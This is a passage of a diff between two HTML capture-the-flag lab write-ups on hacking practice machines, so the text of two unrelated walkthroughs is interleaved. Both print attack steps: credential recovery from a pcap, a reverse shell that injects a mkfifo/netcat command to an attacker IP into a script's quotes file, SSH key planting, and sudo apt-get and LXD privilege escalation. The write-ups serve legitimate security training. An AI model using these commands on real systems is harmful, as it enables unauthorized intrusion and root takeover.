-<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htm</span><span class="w">                                            </span>
-<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.html</span>
-<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htpasswds</span>
-<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htpasswd_test</span>
-<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.httr</span><span class="o">-</span><span class="n">oauth</span>
-<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">53</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.php</span><span class="w">                                            </span>
-<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">53</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.php3</span><span class="w">                                           </span>
-<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">09</span><span class="o">:</span><span class="m">24</span><span class="p">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">402</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">index.php</span><span class="w">                                        </span>
-<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">09</span><span class="o">:</span><span class="m">24</span><span class="p">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">402</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">index.php</span><span class="o">/</span><span class="n">login</span><span class="o">/</span><span class="w">                                 </span>
-<span class="hll"><span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">09</span><span class="o">:</span><span class="m">27</span><span class="p">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">307</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">mail</span><span class="w">  </span><span class="o">-&gt;</span><span class="w">  </span><span class="n">http</span><span class="o">://</span><span class="m">10.10</span><span class="n">.</span><span class="m">80.3</span><span class="o">/</span><span class="n">mail</span><span class="o">/</span><span class="w">                </span>
-</span><span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">09</span><span class="o">:</span><span class="m">27</span><span class="p">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span><span class="o">-</span><span class="w">    </span><span class="m">2</span><span class="n">KB</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">mail</span><span class="o">/</span><span class="w">                                            </span>
-<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">09</span><span class="o">:</span><span class="m">37</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">server</span><span class="o">-</span><span class="n">status</span><span class="w">                                    </span>
-<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">09</span><span class="o">:</span><span class="m">37</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">server</span><span class="o">-</span><span class="n">status</span><span class="o">/</span>
-</code></pre></div></td></tr></table></div>
-<p>Upon visiting the site, I received a pcap file and some development progress information. </p>
+<p>Initially, I enumerated the FTP service at port 21 with <em>anonymous</em> login and discovered the <strong>dad_tasks</strong> file, which appeared as gibberish after decoding with base64. </p>
 <p><img id="image1" /></p>
-<p><img id="image2" /></p>
-<p>While analyzing the pcap file, I discovered the domain for the development site and obtained a username and password for login.</p>
-<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
-<span class="normal"> 2</span>
-<span class="normal"> 3</span>
-<span class="normal"> 4</span>
-<span class="normal"> 5</span>
-<span class="normal"> 6</span>
-<span class="normal"> 7</span>
-<span class="normal"> 8</span>
-<span class="normal"> 9</span>
-<span class="normal">10</span>
-<span class="normal">11</span>
-<span class="normal">12</span>
-<span class="normal">13</span>
-<span class="normal">14</span>
-<span class="normal">15</span>
-<span class="normal">16</span>
-<span class="normal">17</span>
-<span class="normal">18</span></pre></div></td><td class="code"><div><pre><span></span><code>strings<span class="w"> </span>Captured.pcap<span class="w">          </span>
-&lt;eU@
-4eV@
-POST<span class="w"> </span>/login.php<span class="w"> </span>HTTP/1.1
-<span class="hll">Host:<span class="w"> </span>development.smag.thm
-</span>User-Agent:<span class="w"> </span>curl/7.47.0
-Accept:<span class="w"> </span>*/*
-Content-Length:<span class="w"> </span><span class="m">39</span>
-Content-Type:<span class="w"> </span>application/x-www-form-urlencoded
-<span class="hll"><span class="nv">username</span><span class="o">=</span>helpdesk<span class="p">&amp;</span><span class="nv">password</span><span class="o">=[</span>REDACTED<span class="o">]</span>
-</span>HTTP/1.1<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
-Date:<span class="w"> </span>Wed,<span class="w"> </span><span class="m">03</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">2020</span><span class="w"> </span><span class="m">18</span>:04:07<span class="w"> </span>GMT
-Server:<span class="w"> </span>Apache/2.4.18<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
-Content-Length:<span class="w"> </span><span class="m">0</span>
-Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8
-4eX@
-4eY@
-4eZ@
-</code></pre></div></td></tr></table></div>
-<p>Subsequently, when accessing the dev site, I was able to locate a login website where I utilized the credentials obtained in the previous step. </p>
-<p><img id="image3" /></p>
+<div class="highlight"><pre><span></span><code><span class="n">cat</span><span class="w"> </span><span class="n">dad_tasks</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">base64</span><span class="w"> </span><span class="o">--</span><span class="n">decode</span>
+
+<span class="n">Qapw</span><span class="w"> </span><span class="n">Eekcl</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Pvr</span><span class="w"> </span><span class="n">RMKP...XZW</span><span class="w"> </span><span class="n">VWUR...</span><span class="w"> </span><span class="n">TTI</span><span class="w"> </span><span class="n">XEF...</span><span class="w"> </span><span class="n">LAA</span><span class="w"> </span><span class="n">ZRGQRO</span><span class="o">!!!!</span>
+<span class="n">Sfw.</span><span class="w"> </span><span class="n">Kajnmb</span><span class="w"> </span><span class="n">xsi</span><span class="w"> </span><span class="n">owuowge</span>
+<span class="n">Faz.</span><span class="w"> </span><span class="n">Tml</span><span class="w"> </span><span class="n">fkfr</span><span class="w"> </span><span class="n">qgseik</span><span class="w"> </span><span class="n">ag</span><span class="w"> </span><span class="n">oqeibx</span>
+<span class="n">Eljwx.</span><span class="w"> </span><span class="n">Xil</span><span class="w"> </span><span class="n">bqi</span><span class="w"> </span><span class="n">aiklbywqe</span>
+<span class="n">Rsfv.</span><span class="w"> </span><span class="n">Zwel</span><span class="w"> </span><span class="n">vvm</span><span class="w"> </span><span class="n">imel</span><span class="w"> </span><span class="n">sumebt</span><span class="w"> </span><span class="n">lqwdsfk</span>
+<span class="n">Yejr.</span><span class="w"> </span><span class="n">Tqenl</span><span class="w"> </span><span class="n">Vsw</span><span class="w"> </span><span class="n">svnt</span><span class="w"> </span><span class="s">&quot;urqsjetpwbn einyjamu&quot;</span><span class="w"> </span><span class="n">wf.</span>
+
+<span class="n">Iz</span><span class="w"> </span><span class="n">glww</span><span class="w"> </span><span class="n">A</span><span class="w"> </span><span class="n">ykftef....</span><span class="w"> </span><span class="n">Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl</span>
+</code></pre></div>
+<p>I realized that there may be further decoding processes required with other findings during enumeration. so I held up.</p>
+<p>Next, I proceeded to enumerate the website on port 80 and discovered the user <strong>weston</strong>. Upon navigating through the hidden folders, I found several directories, including <code>auditions</code>, <code>contracts</code>, and <code>scripts</code>. </p>
 <h2 id="initial-access"><b>Initial Access</b><a class="headerlink" href="#initial-access" title="Permanent link">&para;</a></h2>
-<p>It redirected to another page and provided me a text field to run any commands hopefully linux ones. However, despite trying various commands, I was unable to display any data. Realizing that it was a blind shot, I hosted a reverse shell from my side and attempted to access it using the wget command. Unfortunately, this approach also did not work. Later, I leveraged the reverse shell netcat command to connect back to the system, which allowed me to gain initial access. </p>
+<p>While exploring <code>auditions</code>, I found an <strong>.mp3</strong> file. </p>
+<p><img id="image2" /></p>
+<div class="admonition tip">
+<p class="admonition-title">Tips &amp; Tricks</p>
+<p><span>When you find a suspicious image file, audio file or video file, It is always good practice to perform stegnography checks.</span></p>
+</div>
+<p>I found a crucial keyword hidden within the audio file, which I later mapped to the decoded text. Using the <strong><code>Vigenere decoding</code></strong> option in <strong>CyberChef</strong>, I decoded the message successfully. </p>
+<p><img id="image3" /></p>
+<p>It turned out to be none other than the SSH credentials for weston.</p>
+<p>Using these credentials, I logged in as <strong><code>weston</code></strong> and executed the <strong>id</strong> command, which revealed that weston belongs to the <strong><code>cage</code></strong> group.</p>
+<div class="highlight"><pre><span></span><code><span class="n">uid</span><span class="o">=</span><span class="m">1001</span><span class="p">(</span><span class="n">weston</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="m">1001</span><span class="p">(</span><span class="n">weston</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="m">1001</span><span class="p">(</span><span class="n">weston</span><span class="p">),</span><span class="m">1000</span><span class="p">(</span><span class="n">cage</span><span class="p">)</span>
+</code></pre></div>
+<p>I also received strange popup messages from the terminal, indicating the presence of a running cron job but actually didn't. </p>
 <p><img id="image4" /></p>
-<p>The user account associated with this access was www-data. </p>
-<p><img id="image5" /></p>
 <h2 id="privilege-escalation"><b>Privilege Escalation</b><a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
-<h3 id="gaining-user-access-jake"><b>Gaining user access (Jake)</b><a class="headerlink" href="#gaining-user-access-jake" title="Permanent link">&para;</a></h3>
-<p>While enumerating the system, I discovered a CRON job that ran every minute with the command:</p>
-<p><code>/bin/cat /opt/.backups/jake_id_rsa.pub.backup &gt; /home/jake/.ssh/authorized_keys</code></p>
+<h3 id="gaining-user-access-cage"><b>Gaining user access (cage)</b><a class="headerlink" href="#gaining-user-access-cage" title="Permanent link">&para;</a></h3>
+<p>Later, I attempted to locate files owned by the <strong><code>cage</code></strong> group using the following command and discovered two files.</p>
+<p><img id="image5" /></p>
+<div class="admonition abstract">
+<p class="admonition-title">spread_the_quotes.py</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
+<span class="c1">#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">random</span>
+
+<span class="n">lines</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/opt/.dads_scripts/.files/.quotes&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
+<span class="n">quote</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">lines</span><span class="p">)</span>
+<span class="hll"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;wall &quot;</span> <span class="o">+</span> <span class="n">quote</span><span class="p">)</span>
+</span></code></pre></div></td></tr></table></div>
+</div>
+<p>I overwrote the <strong>quote</strong> variable in the <code>/opt/.dads_scripts/.files/.quotes</code> directory with a reverse shell command. </p>
+<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.17.3.217 5432 &gt;/tmp/f&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>/opt/.dads_scripts/.files/.quotes
+</code></pre></div>
+<p>Within three minutes, I obtained a reverse shell for cage.</p>
 <p><img id="image6" /></p>
-<p>I found a public ssh key present in the <strong>authorized_keys</strong> file, and as I had write permissions, I was eager to impersonate it. To do so, I created a SSH key pair with public and private keys, and overwrote my public key to <strong><code>/opt/.backups/jake_id_rsa.pub.backup</code></strong>, which saved to <strong><code>/home/jake/.ssh/authorized_keys</code></strong>.</p>
-<p><img id="image7" /></p>
-<div class="admonition abstract">
-<p class="admonition-title">Note</p>
-<p><span><strong>authorized_keys</strong> contains a list of public keys that are authorized to access a user's account on a remote system, and it does not explicitly require passwords, but instead requires the private key of the public key present in that file.</span></p>
-</div>
-<p>Since I possessed my private key, I logged in as Jake using the following command and found the user flag.</p>
-<div class="highlight"><pre><span></span><code><span class="n">ssh</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="o">~/</span><span class="n">.ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="w"> </span><span class="n">jake</span><span class="o">@</span><span class="m">10.10</span><span class="n">.</span><span class="m">80.3</span>
-</code></pre></div>
-<p><img id="image8" /></p>
-<div class="admonition abstract">
-<p class="admonition-title">Note</p>
-<p><span>To pass a private key when connecting to a remote system, the file must have <strong>600</strong> permission to carry out the action, ensuring that only the user has access to read and write, and no one else.</span></p>
-</div>
+<p>Although I attempted to stabilize the shell, it did not respond for some reason. Further attempts to establish a meterpreter session also failed. Therefore, I accessed the SSH using the private key found in the <code>.ssh</code> folder.</p>
+<p>Upon obtaining access, I found the first flag in the <strong><code>Super-Duper-checklist</code></strong>. </p>
 <h3 id="gaining-root-access"><b>Gaining root access</b><a class="headerlink" href="#gaining-root-access" title="Permanent link">&para;</a></h3>
-<p>Once I had gained access to Jake's account, I made it to escalate privileges to root. My first step was to search for any sudo powers that Jake possessed. </p>
-<p><img id="image9" /></p>
-<p>I quickly searched the database of <a href="https://gtfobins.github.io/gtfobins/apt-get/#sudo">gtfobins</a> where you can find different commands to bypass local security restrictions.
-Using the following command, I successufully grabbed the root flag.</p>
-<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>apt-get<span class="w"> </span>update<span class="w"> </span>-o<span class="w"> </span>APT::Update::Pre-Invoke::<span class="o">=</span>/bin/sh
+<p>Typing the <strong>id</strong> command again revealed that the <strong><code>cage</code></strong> account belonged to the <strong><code>LXD</code></strong> group. I then performed a common exploit for this group and achieved root access.</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Clone https://github.com/saghul/lxd-alpine-builder.git</span>
+
+<span class="c1"># Run this</span>
+<span class="nb">cd</span><span class="w"> </span>lxd-alphine-bulder
+./build-alphine
+
+<span class="c1"># Transfer the file to victim machine</span>
+
+<span class="c1"># Add the image to victim’s lxd container</span>
+lxc<span class="w"> </span>image<span class="w"> </span>import<span class="w"> </span>./apline-v3.10-x86_64–20191008_1227.tar.gz<span class="w"> </span>—<span class="w"> </span><span class="nb">alias</span><span class="w"> </span>myimage
+
+<span class="c1"># Initialise and mount:</span>
+lxc<span class="w"> </span>init<span class="w"> </span>myimage<span class="w"> </span>ignite<span class="w"> </span>-c<span class="w"> </span>security.privileged<span class="o">=</span><span class="nb">true</span>
+lxc<span class="w"> </span>config<span class="w"> </span>device<span class="w"> </span>add<span class="w"> </span>ignite<span class="w"> </span>mydevice<span class="w"> </span>disk<span class="w"> </span><span class="nv">source</span><span class="o">=</span>/<span class="w"> </span><span class="nv">path</span><span class="o">=</span>/mnt/root<span class="w"> </span><span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>
+lxc<span class="w"> </span>start<span class="w"> </span>ignite
+lxc<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>ignite<span class="w"> </span>/bin/sh
 </code></pre></div>
-<p><img id="image10" /></p>
+<div class="admonition question">
+<p class="admonition-title">More Info</p>
+<p><span>More information can be found on <a href="https://www.hackingarticles.in/lxd-privilege-escalation/">LXD Privilege Escalation</a> as this blog is not intended for explaining this method in detail.</span></p>
+</div>
+<p>Although I initially struggled to locate the root.txt file, I eventually found it in the <strong><code>/mnt/root/root</code></strong> folder and successfully completed the room.</p>
+<p><img id="image7" /></p>
 <script>
 
 // JSON object
 const data = {
-    "desc": "Follow the yellow brick road. Deploy the machine and get root privileges.",
-    "ip":  "10.10.80.3",
-    "ports": "22/tcp,ssh,OpenSSH 7.2p2 Ubuntu 4ubuntu2.8;80/tcp,http,Apache httpd 2.4.18",
+    "desc": "Help Cage bring back his acting career and investigate the nefarious goings on of his agent! Let's find out what his agent is up to....",
+    "ip":  "10.10.128.173",
+    "ports": "21/tcp,ftp,vsftpd 3.0.3;22/tcp,ssh,OpenSSH 7.6p1 Ubuntu 4ubuntu0.3;80/tcp,http,Apache httpd 2.4.29",
     "difficulty":"easy",
-    "id": "10"
+    "id": "12"
 }
 
 
@@ -1139,7 +1134,7 @@ updateHTML();
       <nav class="md-footer__inner md-grid" aria-label="Footer" >
         
           
-          <a href="../h4cked/" class="md-footer__link md-footer__link--prev" aria-label="Previous: H4cked" rel="prev">
+          <a href="../pokemon/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Gotta Catch&#39;em All!" rel="prev">
             <div class="md-footer__button md-icon">
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
             </div>
@@ -1148,26 +1143,11 @@ updateHTML();
                 <span class="md-footer__direction">
                   Previous
                 </span>
-                H4cked
-              </div>
-            </div>
-          </a>
-        
-        
-          
-          <a href="../pokemon/" class="md-footer__link md-footer__link--next" aria-label="Next: Gotta Catch&#39;em All!" rel="next">
-            <div class="md-footer__title">
-              <div class="md-ellipsis">
-                <span class="md-footer__direction">
-                  Next
-                </span>
                 Gotta Catch'em All!
               </div>
             </div>
-            <div class="md-footer__button md-icon">
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
-            </div>
           </a>
+        
         
       </nav>
     
